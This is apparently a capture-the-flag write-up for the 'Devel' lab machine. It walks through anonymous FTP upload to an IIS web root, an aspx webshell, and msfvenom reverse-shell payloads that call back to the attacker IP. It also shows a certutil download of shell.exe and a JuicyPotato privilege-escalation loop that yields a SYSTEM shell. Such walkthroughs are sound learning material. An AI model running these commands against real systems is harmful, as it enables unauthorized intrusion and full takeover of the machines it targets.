# Devel (Easy/TJ Null)  

## Nmap  

Port 0-15000.  

```
21/tcp open  ftp     syn-ack Microsoft ftpd
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
```  

Http server.  

`Microsoft-IIS/7.5`  

FTP system OS.  

`Windows_NT`

## FTP  

Anonymous login allowed. Directory looks like web root. To prove this, a text file will be uploaded and accessed from the browser.  

`put test.txt`  

As this was a success, the next logical step is to attempt to load a shell.  

## Shell  

Using the following command to create a .asp reverse shell.  

`msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.85 LPORT=4444 -f asp > shell.asp`  

This did not work and returned an internal server error 500.  

Using a .aspx webshell from the following source.  

`https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx`  

It is now possible to execute commands on the system.  

## Shell 2  

Creating an reverse shell executable.  

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.85 LPORT=4444 -f exe > shell.exe`  

Starting a python http server and getting shell file from attack machine.  

`certutil -urlcache -f http://10.10.14.85:8000/shell.exe c:\Windows\Temp\shell.exe`  

This successfully returns a shell to the listener on 4444.  

## Priv Esc  

The current user has the following priv with 'whoami /priv'.  

`SeImpersonatePrivilege    Enabled`  

After downloading JuicyPotato.exe, it didn't work due to it not being x86. Getting a 32 bit from the following.  

`https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe`  

As this is a windows 7 enterprise, I download the CLSID list.  

`https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/Windows_7_Enterprise/CLSID.list`  

Creating a reverse shell to be used as root.  

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.85 LPORT=5555 -f exe > rootshell.exe`  

Creating a .bat file with the following command.  

`for CLSID in $(cat CLSID.list);do echo "c:\Windows\Temp\JuicyPotato.exe -l 1337 -t * -p c:\Windows\Temp\rootshell.exe -c $CLSID" >> commands.bat;done`  

Adding the following to the first line of the commands.bat file.  

`@echo off`  

Transfer JuicyPotato.exe, rootshell.exe and commands.bat, then run the batch file.  

`.\commands.bat`  

After each line is run, eventually a root shell is returned to our listener on 5555.
